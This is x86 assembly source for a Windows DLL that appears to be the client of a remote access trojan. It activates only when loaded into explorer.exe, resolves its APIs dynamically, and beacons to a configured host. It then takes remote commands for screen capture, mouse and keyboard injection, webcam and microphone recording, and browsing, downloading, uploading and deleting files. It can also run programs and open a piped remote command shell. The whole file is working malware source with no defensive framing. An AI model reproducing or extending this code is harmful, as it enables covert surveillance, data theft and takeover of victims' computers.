.386
.model flat, stdcall
option casemap :none

include hsbclient.inc

.code

include other.asm

OnReceive	proc uses ebx ecx esi edi
LOCAL   @desktopbuf,@desktopsize,@lpsend,@hfindfile,@lsls
LOCAL	@finddata:WIN32_FIND_DATA
	assume esi:ptr OVERLAPPEDPLUS
	mov eax,[esi].socktag
	.if eax==SOCKETTAG.desktopconn
		invoke GetSystemMetrics,SM_CXSCREEN 
		mov stpoint.x,eax
		invoke GetSystemMetrics,SM_CYSCREEN
		mov stpoint.y,eax
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,sizeof POINT
		mov edi,eax
		invoke LYQMoveMemory,edi,addr stpoint,sizeof POINT
		invoke Connects
		mov ebx,eax
		invoke WSASends,ebx,edi,sizeof POINT,SOCKETTAG.desktopconn
	.elseif eax==SOCKETTAG.desktopsend
		mov [esi].other,2
		invoke LYQMoveMemory,addr [esi].bbmpinit,[esi].lpBuffer,[esi].dwLength
		invoke GetDesktop,addr @desktopbuf,addr @desktopsize
		invoke WSASends,[esi].hsocket,@desktopbuf,@desktopsize,SOCKETTAG.desktopsend
	.elseif eax==SOCKETTAG.desktopxy
		mov edi,[esi].lpBuffer
		assume edi:ptr POINT
		mov eax,[edi].x
		mov ebx,65536
		mul ebx
		xor edx,edx
		div stpoint.x
		mov [esi].dwLength,eax
		mov eax,[edi].y
		mov ebx,65536
		mul ebx
		xor edx,edx
		div stpoint.y
		mov ebx,eax	
		invoke mouse_event,MOUSEEVENTF_MOVE or MOUSEEVENTF_ABSOLUTE,[esi].dwLength,ebx,NULL,NULL
		assume edi:nothing
	.elseif eax==SOCKETTAG.desktopldb
		mov edi,[esi].lpBuffer
		assume edi:ptr POINT
		mov eax,[edi].x
		mov ebx,65536
		mul ebx
		xor edx,edx
		div stpoint.x
		mov [esi].dwLength,eax
		mov eax,[edi].y
		mov ebx,65536
		mul ebx
		xor edx,edx
		div stpoint.y
		mov ebx,eax	
		invoke mouse_event,MOUSEEVENTF_MOVE or MOUSEEVENTF_ABSOLUTE,[esi].dwLength,ebx,NULL,NULL
		invoke mouse_event,MOUSEEVENTF_LEFTDOWN or MOUSEEVENTF_ABSOLUTE,[esi].dwLength,ebx,NULL,NULL
		invoke mouse_event,MOUSEEVENTF_LEFTUP or MOUSEEVENTF_ABSOLUTE,[esi].dwLength,ebx,NULL,NULL
		invoke mouse_event,MOUSEEVENTF_LEFTDOWN or MOUSEEVENTF_ABSOLUTE,[esi].dwLength,ebx,NULL,NULL
		invoke mouse_event,MOUSEEVENTF_LEFTUP or MOUSEEVENTF_ABSOLUTE,[esi].dwLength,ebx,NULL,NULL
		assume edi:nothing
	.elseif eax==SOCKETTAG.desktopldown
		mov edi,[esi].lpBuffer
		assume edi:ptr POINT
		mov eax,[edi].x
		mov ebx,65536
		mul ebx
		xor edx,edx
		div stpoint.x
		mov [esi].dwLength,eax
		mov eax,[edi].y
		mov ebx,65536
		mul ebx
		xor edx,edx
		div stpoint.y
		mov ebx,eax	
		invoke mouse_event,MOUSEEVENTF_MOVE or MOUSEEVENTF_ABSOLUTE,[esi].dwLength,ebx,NULL,NULL
		invoke mouse_event,MOUSEEVENTF_LEFTDOWN or MOUSEEVENTF_ABSOLUTE,[esi].dwLength,ebx,NULL,NULL
		assume edi:nothing
	.elseif eax==SOCKETTAG.desktoprdown
		mov edi,[esi].lpBuffer
		assume edi:ptr POINT
		mov eax,[edi].x
		mov ebx,65536
		mul ebx
		xor edx,edx
		div stpoint.x
		mov [esi].dwLength,eax
		mov eax,[edi].y
		mov ebx,65536
		mul ebx
		xor edx,edx
		div stpoint.y
		mov ebx,eax	
		invoke mouse_event,MOUSEEVENTF_MOVE or MOUSEEVENTF_ABSOLUTE,[esi].dwLength,ebx,NULL,NULL
		invoke mouse_event,MOUSEEVENTF_RIGHTDOWN or MOUSEEVENTF_ABSOLUTE,[esi].dwLength,ebx,NULL,NULL
		assume edi:nothing
	.elseif eax==SOCKETTAG.desktoplup
		mov edi,[esi].lpBuffer
		assume edi:ptr POINT
		mov eax,[edi].x
		mov ebx,65536
		mul ebx
		xor edx,edx
		div stpoint.x
		mov [esi].dwLength,eax
		mov eax,[edi].y
		mov ebx,65536
		mul ebx
		xor edx,edx
		div stpoint.y
		mov ebx,eax	
		invoke mouse_event,MOUSEEVENTF_MOVE or MOUSEEVENTF_ABSOLUTE,[esi].dwLength,ebx,NULL,NULL
		invoke mouse_event,MOUSEEVENTF_LEFTUP or MOUSEEVENTF_ABSOLUTE,[esi].dwLength,ebx,NULL,NULL
		assume edi:nothing
	.elseif eax==SOCKETTAG.desktoprup
		mov edi,[esi].lpBuffer
		assume edi:ptr POINT
		mov eax,[edi].x
		mov ebx,65536
		mul ebx
		xor edx,edx
		div stpoint.x
		mov [esi].dwLength,eax
		mov eax,[edi].y
		mov ebx,65536
		mul ebx
		xor edx,edx
		div stpoint.y
		mov ebx,eax	
		invoke mouse_event,MOUSEEVENTF_MOVE or MOUSEEVENTF_ABSOLUTE,[esi].dwLength,ebx,NULL,NULL
		invoke mouse_event,MOUSEEVENTF_RIGHTUP or MOUSEEVENTF_ABSOLUTE,[esi].dwLength,ebx,NULL,NULL
		assume edi:nothing
	.elseif eax==SOCKETTAG.desktopkey
		mov edi,[esi].lpBuffer
		mov ebx,dword ptr[edi]
		mov edi,dword ptr[edi+4]
		invoke keybd_event,ebx,edi,KEYEVENTF_EXTENDEDKEY,NULL
		invoke keybd_event,ebx,edi,KEYEVENTF_KEYUP,NULL
	.elseif eax==SOCKETTAG.desktopclose
		mov [esi].otherfree,1
		invoke PostQueuedCompletionStatus,hiocp,0,0,esi
	.elseif eax==SOCKETTAG.cameraconn
		invoke PostThreadMessage,CameraThreadID,402h,NULL,esi
	.elseif eax==SOCKETTAG.camerasend
		mov [esi].other,3
		invoke PostThreadMessage,CameraThreadID,404h,NULL,esi
	.elseif eax==SOCKETTAG.cameraclose
		mov [esi].otherfree,1
		invoke PostQueuedCompletionStatus,hiocp,0,0,esi
	.elseif eax==SOCKETTAG.recconn
		invoke Connects
		mov ebx,eax
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,2
		invoke WSASends,ebx,eax,2,SOCKETTAG.recconn
	.elseif eax==SOCKETTAG.recsend
		mov [esi].other,4
		invoke StartRec
	.elseif eax==SOCKETTAG.recclose
		mov [esi].otherfree,1
		invoke PostQueuedCompletionStatus,hiocp,0,0,esi
	.elseif eax==SOCKETTAG.fileconn
		invoke Connects
		mov ebx,eax
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,101
		mov edi,eax
		invoke GetLogicalDriveStrings,101,edi
		invoke WSASends,ebx,edi,101,SOCKETTAG.fileconn
	.elseif eax==SOCKETTAG.getfilestr
		mov [esi].other,5
		invoke LYQZeroMemory,addr @finddata,sizeof WIN32_FIND_DATA
		invoke lstrcat,[esi].lpBuffer,CTEXT("*.*")
		invoke GetFileStrSize,[esi].lpBuffer
		mov @lsls,eax
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,@lsls
		mov @lpsend,eax
		mov edi,eax
		invoke FindFirstFile,[esi].lpBuffer,addr @finddata
		.if eax!=INVALID_HANDLE_VALUE
			mov @hfindfile,eax
			.repeat
				.if @finddata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY
					invoke lstrcat,addr @finddata.cFileName,CTEXT("\")
					invoke lstrlen,addr @finddata.cFileName
					mov ebx,eax
					invoke LYQMoveMemory,edi,addr @finddata.cFileName,ebx
					add edi,ebx
					inc edi
				.else
					invoke lstrlen,addr @finddata.cFileName
					mov ebx,eax
					invoke LYQMoveMemory,edi,addr @finddata.cFileName,ebx
					add edi,ebx
					inc edi
				.endif
				invoke FindNextFile,@hfindfile,addr @finddata
			.until	eax==FALSE
			invoke FindClose,@hfindfile		
		.endif
		invoke WSASends,[esi].hsocket,@lpsend,@lsls,SOCKETTAG.sendfilestr
	.elseif eax==SOCKETTAG.fileinfo
		invoke CreateFile,[esi].lpBuffer,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL
		.if eax!=INVALID_HANDLE_VALUE
			mov [esi].hfile,eax
			invoke GetFileSize,[esi].hfile,NULL
			mov [esi].nfilesize,eax
			invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,4
			mov ebx,eax
			invoke LYQMoveMemory,ebx,addr [esi].nfilesize,4
			mov [esi].nfileseek,0
			invoke WSASends,[esi].hsocket,ebx,4,SOCKETTAG.fileinfo
		.endif	
	.elseif eax==SOCKETTAG.gofile
		mov ebx,[esi].nfilesize
		mov eax,[esi].nfileseek
		sub ebx,eax
		.if ebx>8192
		    invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,8192
		    mov edi,eax
			invoke ReadFile,[esi].hfile,edi,8192,addr @lsls,NULL
			add [esi].nfileseek,8192
			invoke WSASends,[esi].hsocket,edi,8192,SOCKETTAG.gofile
		.else
		    invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,ebx
		    mov edi,eax
			invoke ReadFile,[esi].hfile,edi,ebx,addr @lsls,NULL
			add [esi].nfileseek,ebx
			invoke WSASends,[esi].hsocket,edi,ebx,SOCKETTAG.gofile
		.endif
	.elseif eax==SOCKETTAG.closefile
		invoke CloseHandle,[esi].hfile
	.elseif eax==SOCKETTAG.scfileinfo
		invoke CreateFile,[esi].lpBuffer,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL
		mov [esi].hfile,eax
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,1
		invoke WSASends,[esi].hsocket,eax,1,SOCKETTAG.scgetfilesize
	.elseif eax==SOCKETTAG.scgetfilesize
		mov [esi].nfileseek,0
		invoke LYQMoveMemory,addr [esi].nfilesize,[esi].lpBuffer,[esi].dwLength
		.if [esi].nfilesize>0
			invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,1
			invoke WSASends,[esi].hsocket,eax,1,SOCKETTAG.scgofile
		.else
			invoke CloseHandle,[esi].hfile
			invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,1
			invoke WSASends,[esi].hsocket,eax,1,SOCKETTAG.scclosefile
		.endif	
	.elseif eax==SOCKETTAG.scgofile
		invoke WriteFile,[esi].hfile,[esi].lpBuffer,[esi].dwLength,addr @lsls,NULL
		mov eax,[esi].dwLength
		add [esi].nfileseek,eax
		mov eax,[esi].nfilesize
		.if [esi].nfileseek<eax
			invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,1
			invoke WSASends,[esi].hsocket,eax,1,SOCKETTAG.scgofile
		.else	
			invoke CloseHandle,[esi].hfile
			invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,1
			invoke WSASends,[esi].hsocket,eax,1,SOCKETTAG.scclosefile
		.endif	
	.elseif eax==SOCKETTAG.delfile
		invoke DeleteFile,[esi].lpBuffer	
	.elseif eax==SOCKETTAG.runexe
		push SW_SHOWNORMAL
		push NULL
		push NULL
		push [esi].lpBuffer
		push CTEXT("open")
		push NULL
		call lpShellExecute
	.elseif eax==SOCKETTAG.cmdstart
		invoke CreateThreads,NULL,NULL,addr InitPipe,esi,NULL,NULL
		mov [esi].cmdhthread,eax
	.elseif eax==SOCKETTAG.cmdrun
		invoke WriteFile,[esi].hWritePipeHandle,[esi].lpBuffer,[esi].dwLength,addr @lsls,NULL
	.elseif eax==SOCKETTAG.cmdclose
		invoke ClosePipe
	.endif	
	assume esi:nothing
	ret
OnReceive	endp

WrokerIOFree proc uses ebx ecx esi edi
	assume esi:ptr OVERLAPPEDPLUS			
	.if	[esi].nfree==0
		mov [esi].nfree,1  
		.if [esi].other==18
			mov [esi].other,0
			mov dwipstr,0
		.elseif [esi].other==2
			invoke SelectObject,[esi].hMemDC,[esi].oldhbitmap
		    invoke DeleteObject,[esi].hBitmap
			invoke DeleteDC,[esi].hMemDC
			invoke DeleteDC,[esi].hScrDC
			invoke GlobalFree,[esi].lpscrbmp
			invoke GlobalFree,[esi].lpdstbmp
			invoke GlobalFree,[esi].lptmpbmp
		.elseif [esi].other==3
			invoke PostThreadMessage,CameraThreadID,408h,NULL,esi
		.elseif [esi].other==4
			mov [esi].hBitmap,1
			push [esi].hWaveIn
			call lpwaveInReset
;			invoke waveInReset,[esi].hWaveIn
			push [esi].hWaveIn
			call lpwaveInClose
;			invoke waveInClose,[esi].hWaveIn
		.elseif [esi].other==5
			invoke CloseHandle,[esi].hfile	
		.endif
		.if [esi].opCode!=3
			invoke closesocket,[esi].hsocket
		.endif
		invoke GlobalFree,[esi].wsabuf.buf
		invoke GlobalFree,[esi].lpBuffer
		;invoke GlobalFree,esi
	.endif
	assume esi:nothing
	ret
WrokerIOFree endp

WorkerThread	proc uses ebx ecx esi edi lParam
	LOCAL	@stck,@NumberOfBytes:dword
	LOCAL	@overlapped,@lsls:dword
	LOCAL	@recvbytes,@flags:dword
	.while TRUE
		mov @NumberOfBytes,0
		mov @overlapped,0
		mov @lsls,0
		invoke GetQueuedCompletionStatus,hiocp,addr @NumberOfBytes,addr @stck,addr @overlapped,INFINITE		
		.if eax==0 && @overlapped==0
			.continue
		.elseif eax==0 && @overlapped!=0
			mov @lsls,1
		.endif
		mov esi,@overlapped
		assume esi:ptr OVERLAPPEDPLUS
		invoke InterlockedCompareExchange,addr [esi].hcpumutex,lParam,0
		invoke WaitForSingleObject,[esi].hcpumutex,INFINITE
		.if [esi].opCode==0 || @lsls || [esi].nfree || [esi].otherfree
			invoke WrokerIOFree
	   	.elseif	@NumberOfBytes==0
   			xor eax,eax
	    .elseif [esi].opCode==1
        	mov edi,[esi].lpBuffer
        	add edi,[esi].dwSeek
        	invoke LYQMoveMemory,edi,[esi].wsabuf.buf,@NumberOfBytes
            mov eax,@NumberOfBytes
            add [esi].dwSeek,eax	  
            mov eax,[esi].dwLength          
            .if [esi].dwSeek==eax
            	mov edi,[esi].lpBuffer
            	mov eax,dword ptr[edi]
            	mov [esi].dwLength,eax
            	xor eax,eax
				mov ax,word ptr[edi+4]
				mov [esi].socktag,eax
		    	mov edi,dword ptr[edi+6]
		    	invoke GetCRC32,[esi].lpBuffer,6
		    	.if eax!=edi
	            	invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,10
	            	mov [esi].lpBuffer,eax
	            	mov [esi].dwLength,10
	            	invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,10
	            	mov [esi].wsabuf.buf,eax
	            	mov [esi].wsabuf.len,10
					mov [esi].opCode,0
					invoke WrokerIOFree
				    invoke ReleaseMutex,[esi].hcpumutex
					.continue
		    	.endif
				invoke GlobalReAlloc,[esi].lpBuffer,[esi].dwLength,GMEM_ZEROINIT or GMEM_MOVEABLE
				mov [esi].lpBuffer,eax
				invoke GlobalReAlloc,[esi].wsabuf.buf,[esi].dwLength,GMEM_ZEROINIT or GMEM_MOVEABLE
				mov [esi].wsabuf.buf,eax
				m2m [esi].wsabuf.len,[esi].dwLength
		    	invoke LYQZeroMemory,addr [esi].ol,sizeof OVERLAPPED
		    	mov [esi].opCode,2
		    	mov [esi].dwSeek,0
		        mov @recvbytes,0
		        mov @flags,0
			    invoke WSARecv,[esi].hsocket,addr [esi].wsabuf,1,addr @recvbytes,addr @flags,esi,NULL	
				.if eax==SOCKET_ERROR
					invoke WSAGetLastError
					.if eax!= WSA_IO_PENDING
						mov [esi].opCode,0
						invoke PostQueuedCompletionStatus,hiocp,0,0,esi
					.endif
				.endif	
            .else
	            mov edi,[esi].dwLength
	            sub edi,[esi].dwSeek
				invoke GlobalReAlloc,[esi].wsabuf.buf,edi,GMEM_ZEROINIT or GMEM_MOVEABLE
				mov [esi].wsabuf.buf,eax
				mov [esi].wsabuf.len,edi
	            invoke LYQZeroMemory,addr [esi].ol,sizeof OVERLAPPED
	            mov @recvbytes,0
		        mov @flags,0
			    invoke WSARecv,[esi].hsocket,addr [esi].wsabuf,1,addr @recvbytes,addr @flags,esi,NULL	
				.if eax==SOCKET_ERROR
					invoke WSAGetLastError
					.if eax!= WSA_IO_PENDING
						mov [esi].opCode,0
						invoke PostQueuedCompletionStatus,hiocp,0,0,esi
					.endif
				.endif	
            .endif
	    .elseif [esi].opCode==2
    	    mov edi,[esi].lpBuffer
        	add edi,[esi].dwSeek
        	invoke LYQMoveMemory,edi,[esi].wsabuf.buf,@NumberOfBytes
            mov eax,@NumberOfBytes
            add [esi].dwSeek,eax
            mov eax,[esi].dwLength
            .if [esi].dwSeek==eax
            	;/////////////////////////////////////////
	            invoke OnReceive
            	;////////////////////////////////////////
				invoke GlobalReAlloc,[esi].wsabuf.buf,10,GMEM_ZEROINIT or GMEM_MOVEABLE
				mov [esi].wsabuf.buf,eax
				mov [esi].wsabuf.len,10
				invoke GlobalReAlloc,[esi].lpBuffer,10,GMEM_ZEROINIT or GMEM_MOVEABLE
				mov [esi].lpBuffer,eax
				mov [esi].dwLength,10
		    	invoke LYQZeroMemory,addr [esi].ol,sizeof OVERLAPPED
		    	mov [esi].opCode,1
		    	mov [esi].socktag,0
		    	mov [esi].dwSeek,0	   		         
		    	mov @recvbytes,0
		        mov @flags,0 
		    	invoke WSARecv,[esi].hsocket,addr [esi].wsabuf,1,addr @recvbytes,addr @flags,esi,NULL        
				.if eax==SOCKET_ERROR
					invoke WSAGetLastError
					.if eax!= WSA_IO_PENDING
						mov [esi].opCode,0
						invoke PostQueuedCompletionStatus,hiocp,0,0,esi
					.endif
				.endif		            
            .else
	            mov edi,[esi].dwLength
	            sub edi,[esi].dwSeek
	            invoke GlobalReAlloc,[esi].wsabuf.buf,edi,GMEM_ZEROINIT or GMEM_MOVEABLE
	            mov [esi].wsabuf.buf,eax
	            mov [esi].wsabuf.len,edi
	            invoke LYQZeroMemory,addr [esi].ol,sizeof OVERLAPPED
	            mov @recvbytes,0
		        mov @flags,0
			    invoke WSARecv,[esi].hsocket,addr [esi].wsabuf,1,addr @recvbytes,addr @flags,esi,NULL		            	
				.if eax==SOCKET_ERROR
					invoke WSAGetLastError
					.if eax!= WSA_IO_PENDING
						mov [esi].opCode,0
						invoke PostQueuedCompletionStatus,hiocp,0,0,esi
					.endif
				.endif		            
            .endif
	    .elseif [esi].opCode==3
	    	mov edi,[esi].dwSeek
	    	mov eax,@NumberOfBytes
	    	.if eax==[esi].dwLength || edi==[esi].dwLength
				invoke GlobalFree,[esi].wsabuf.buf
				invoke GlobalFree,[esi].lpBuffer
			    invoke ReleaseMutex,[esi].hcpumutex
	    		invoke GlobalFree,esi
				.continue
	    	.else
	    		mov eax,@NumberOfBytes
	    		add [esi].dwSeek,eax
	    		mov edi,[esi].dwLength
	    		sub edi,[esi].dwSeek
				invoke GlobalReAlloc,[esi].wsabuf.buf,edi,GMEM_ZEROINIT or GMEM_MOVEABLE
	    		mov [esi].wsabuf.buf,eax
	    		mov [esi].wsabuf.len,edi
	    		mov eax,[esi].lpBuffer
	    		add eax,[esi].dwSeek
	    		invoke LYQMoveMemory,[esi].wsabuf.buf,eax,edi
	    		invoke LYQZeroMemory,addr [esi].ol,sizeof OVERLAPPED
			    mov @recvbytes,0
				mov @flags,0
				invoke WSASend,[esi].hsocket,addr [esi].wsabuf,1,addr @recvbytes,@flags,esi,NULL	
				.if eax==SOCKET_ERROR
					invoke WSAGetLastError
					.if eax!= WSA_IO_PENDING
						mov [esi].otherfree,1
						invoke PostQueuedCompletionStatus,hiocp,0,0,esi
					.endif
				.endif		
	    	.endif
	    .endif
	    invoke ReleaseMutex,[esi].hcpumutex
	    assume esi:nothing
 	.endw
	ret
WorkerThread	endp

ConnectThread	proc uses ebx ecx esi edi lParam
	mov esi,lParam
	assume esi:ptr OVERLAPPEDPLUS
	.while [esi].other
		invoke Sleep,77777
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,2
		invoke WSASends,[esi].hsocket,eax,2,SOCKETTAG.tag
	.endw
	assume esi:nothing
	ret
ConnectThread endp

ConnectTimer	proc uses ebx ecx esi edi lParam
	LOCAL	@stsin:sockaddr_in
	LOCAL	@newsock,@dwlsipstr:dword
	LOCAL	@recvbytes,@flags:dword
	mov eax,offset szqjip
	mov eax,dword ptr[eax+92]
	mov dwipport,eax
	.while TRUE
		invoke Sleep,77777
		invoke gethostbyname,addr szqjip
		.if eax
		    mov eax,[eax+hostent.h_list]
		    mov eax,[eax]
		    mov eax,[eax]
		    mov @dwlsipstr,eax
			mov @stsin.sin_addr,eax
			invoke htons,dwipport
			mov @stsin.sin_port,ax
			mov @stsin.sin_family,AF_INET
			mov @stsin.sin_zero,0
			invoke LYQCmpMemory,addr dwipstr,addr @dwlsipstr,4
		    .if !eax
		    	m2m dwipstr,@dwlsipstr
				invoke socket,AF_INET,SOCK_STREAM,NULL
				mov @newsock,eax
				invoke connect,@newsock,addr @stsin,sizeof @stsin
				.if eax==NULL
					invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,sizeof OVERLAPPEDPLUS
					mov esi,eax
					assume esi:ptr OVERLAPPEDPLUS	
					m2m [esi].lpipport,@dwlsipstr
					m2m [esi].dwport,dwipport
					invoke CreateIoCompletionPort,@newsock,hiocp,NULL,NULL
					mov [esi].wsabuf.len,10
					invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,10
					mov [esi].wsabuf.buf,eax
					m2m [esi].hsocket,@newsock
					mov [esi].opCode,1
					mov [esi].dwSeek,0
					mov [esi].other,18
					mov [esi].socktag,0
					mov [esi].dwLength,10
					invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,10
					mov [esi].lpBuffer,eax
					mov @recvbytes,0
					mov @flags,0
					invoke WSARecv,@newsock,addr [esi].wsabuf,1,addr @recvbytes,addr @flags,esi,NULL	
					.if eax==SOCKET_ERROR
						invoke WSAGetLastError
						.if eax!= WSA_IO_PENDING
							mov [esi].opCode,0
							invoke PostQueuedCompletionStatus,hiocp,0,0,esi
						.endif
					.endif
					invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,80
					mov edi,eax
					invoke LYQMoveMemory,edi,lpCDName,80
					invoke WSASends,[esi].hsocket,edi,80,SOCKETTAG.maxconn
					invoke CreateThreads,NULL,NULL,addr ConnectThread,esi,NULL,NULL
					invoke CloseHandle,eax
					assume esi:nothing
				.else
					mov dwipstr,0	
					invoke closesocket,@newsock	
				.endif	     
			.endif
		.endif
	.endw
	ret
ConnectTimer endp

InitTempData	proc uses ebx ecx esi edi
	LOCAL @lsls,@edi
    LOCAL @stwsa:WSADATA
	LOCAL @stsysinfo:SYSTEM_INFO
	mov dwipstr,0
	mov bStartCapture,0
	invoke LLGPA,addr szkernel,CTEXT("CreateProcessA")
	mov lpCreateProcess,eax
	cmp eax,0
	jz @f
	invoke LLGPA,addr szkernel,CTEXT("CreateThread")
	mov lpCreateThread,eax
	cmp eax,0
	jz @f
	invoke LLGPA,addr szkernel,CTEXT("TerminateThread")
	mov lpTerminateThread,eax
	cmp eax,0
	jz @f
	invoke LLGPA,addr szkernel,CTEXT("TerminateProcess")
	mov lpTerminateProcess,eax
	cmp eax,0
	jz @f
	invoke LLGPA,CTEXT("shell32.dll"),CTEXT("ShellExecuteA")
	mov lpShellExecute,eax
	cmp eax,0
	jz @f
	invoke LLGPA,CTEXT("user32.dll"),CTEXT("PostThreadMessageA")
	mov lpPostThreadMessage,eax
	cmp eax,0
	jz @f
	invoke LLGPA,addr szwinmm,CTEXT("waveInOpen")
	mov lpwaveInOpen,eax
	cmp eax,0
	jz @f
	invoke LLGPA,addr szwinmm,CTEXT("waveInPrepareHeader")
	mov lpwaveInPrepareHeader,eax
	cmp eax,0
	jz @f
	invoke LLGPA,addr szwinmm,CTEXT("waveInUnprepareHeader")
	mov lpwaveInUnprepareHeader,eax
	cmp eax,0
	jz @f
	invoke LLGPA,addr szwinmm,CTEXT("waveInAddBuffer")
	mov lpwaveInAddBuffer,eax
	cmp eax,0
	jz @f
	invoke LLGPA,addr szwinmm,CTEXT("waveInStart")
	mov lpwaveInStart,eax
	cmp eax,0
	jz @f
	invoke LLGPA,addr szwinmm,CTEXT("waveInReset")
	mov lpwaveInReset,eax
	cmp eax,0
	jz @f
	invoke LLGPA,addr szwinmm,CTEXT("waveInClose")
	mov lpwaveInClose,eax
	cmp eax,0
	jz @f
	invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,80
	mov lpCDName,eax
	mov @lsls,80
	invoke GetComputerName,lpCDName,addr @lsls
	invoke WSAStartup,0002h,addr @stwsa
	invoke CreateIoCompletionPort,INVALID_HANDLE_VALUE,NULL,NULL,NULL
	mov hiocp,eax
	invoke GetSystemInfo,addr @stsysinfo
	xor edi,edi
	mov ebx,@stsysinfo.dwNumberOfProcessors
	shl ebx,1
    .while edi<ebx
    	inc edi
    	invoke CreateMutex,NULL,FALSE,NULL
    	invoke CreateThreads,NULL,NULL,addr WorkerThread,eax,NULL,NULL
    .endw
	invoke CreateThreads,NULL,NULL,addr ConnectTimer,NULL,NULL,NULL
	invoke CreateThreads,NULL,NULL,addr CameraThread,NULL,NULL,addr CameraThreadID
@@:
	ret
InitTempData	endp

DLLEntry	proc uses ebx ecx esi edi hInstDll,dwReason,dwReserved
	LOCAL @lsbytes[MAX_PATH]:byte
	LOCAL @lsstr[MAX_PATH]:byte
	.if dwReason==DLL_PROCESS_ATTACH
		invoke GetCommandLine
		mov ebx,eax
		invoke lstrlen,ebx
		mov edi,eax
		invoke LYQZeroMemory,addr @lsstr,MAX_PATH
		invoke LYQMoveMemory,addr @lsstr,ebx,edi
		invoke LYQZeroMemory,addr @lsbytes,MAX_PATH
		invoke GetWindowsDirectory,addr @lsbytes,MAX_PATH
		invoke lstrcat,addr @lsbytes,CTEXT("\explorer.exe")
		invoke lstrcmpi,addr @lsstr,addr @lsbytes
		.if eax==0
			invoke InitTempData
		.endif
	.elseif dwReason==DLL_PROCESS_DETACH
		invoke WSACleanup
	.elseif dwReason==DLL_THREAD_ATTACH
	.elseif dwReason==DLL_THREAD_DETACH		
	.endif
	mov eax,TRUE
	ret
DLLEntry endp

end	DLLEntry